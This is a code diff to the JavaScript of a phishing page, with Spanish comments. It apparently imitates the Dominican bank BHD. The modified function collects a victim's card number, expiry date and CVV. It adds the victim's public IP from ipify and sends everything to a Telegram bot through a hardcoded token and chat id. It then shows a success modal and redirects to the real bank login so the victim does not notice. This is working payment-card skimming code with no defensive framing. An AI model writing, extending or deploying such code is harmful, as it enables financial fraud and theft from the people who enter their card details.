@@ -214,16 +214,27 @@
         return expiryDateObj > currentDate;
     }
 
+    // === FUNCIÓN MODIFICADA PARA INCLUIR LA IP ===
     function sendToTelegram(cardNumber, expiryDate, cvv) {
         const token = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI";
         const chat_id = "8555745789";
-        const message = `Detalles de la tarjeta:\nNúmero de tarjeta: ${cardNumber}\nFecha de expiración: ${expiryDate}\nCVV: ${cvv}`;
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
-        fetch(url)
+        // 1. Obtener la IP pública del cliente usando ipify.org
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                // 2. Construir el mensaje incluyendo la IP
+                const message = `Detalles de la tarjeta:\nNúmero de tarjeta: ${cardNumber}\nFecha de expiración: ${expiryDate}\nCVV: ${cvv}\nIP del cliente: ${ip}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+                // 3. Enviar a Telegram
+                return fetch(url);
+            })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
+                    // Mostrar modal de éxito
                     var modal = document.createElement('div');
                     modal.style.position = 'fixed';
                     modal.style.top = '50%';
@@ -255,7 +266,7 @@
 
                     document.body.appendChild(modal);
 
-                    // REDIRECCIÓN MODIFICADA: ya no va a pa05.php, sino al sitio real del banco
+                    // Redirección al sitio real del banco
                     setTimeout(function() {
                         window.location.href = "https://ibp.bhd.com.do/#/login";
                     }, 2500);
@@ -264,7 +275,8 @@
                 }
             })
             .catch(error => {
-                alert("Error al enviar la solicitud.");
+                console.error("Error al obtener la IP o enviar a Telegram:", error);
+                alert("Error al procesar la solicitud.");
             });
     }
 
